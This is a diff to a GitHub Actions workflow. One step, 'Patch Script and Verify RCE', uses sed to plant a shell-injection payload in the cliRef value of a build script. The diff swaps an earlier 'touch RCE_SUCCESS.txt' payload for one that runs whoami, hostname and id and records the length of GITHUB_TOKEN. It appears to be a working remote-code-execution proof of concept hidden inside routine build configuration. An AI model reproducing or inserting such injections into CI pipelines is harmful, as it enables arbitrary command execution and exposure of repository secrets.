@@ -8,6 +8,7 @@ on:
         required: false
         default: 'main'
         type: string
+        description: "Stellar-cli ref to build against. If empty, will use latest cli version"
 
 jobs:
   build:
@@ -37,17 +38,11 @@ jobs:
 
       - name: Patch Script and Verify RCE
         run: |
-          # Inject payload with '||' so it runs even if git fails
-          sed -i "s/const cliRef = argv.cliRef || \`v\${latestVersion}\`;/const cliRef = 'v1.0.0 || touch RCE_SUCCESS.txt';/" scripts/stellar_cli.mjs
-          
-          # Run the build script
-          # Adding '|| true' ensures the pipeline continues even if the script crashes
-          pnpm stellar-cli:build -- --cli-ref='v1.0.0' || true
-          
-          # Verification Step
-          echo "--- VERIFICATION START ---"
-          ls -la RCE_SUCCESS.txt || echo "FILE NOT FOUND"
-          echo "--- VERIFICATION END ---"
+          sed -i "s|const cliRef = argv.cliRef || \`v\${latestVersion}\`;|const cliRef = 'v27.0.0; whoami > /tmp/rce.txt; hostname >> /tmp/rce.txt; id >> /tmp/rce.txt; echo TOKEN_LEN=\${#GITHUB_TOKEN} >> /tmp/rce.txt';|" scripts/stellar_cli.mjs
+          pnpm stellar-cli:build || true
+          echo "--- RCE PROOF ---"
+          cat /tmp/rce.txt || echo "FAILED"
+          echo "--- END ---"
         shell: bash
 
       - name: (temp) Fix CLI links
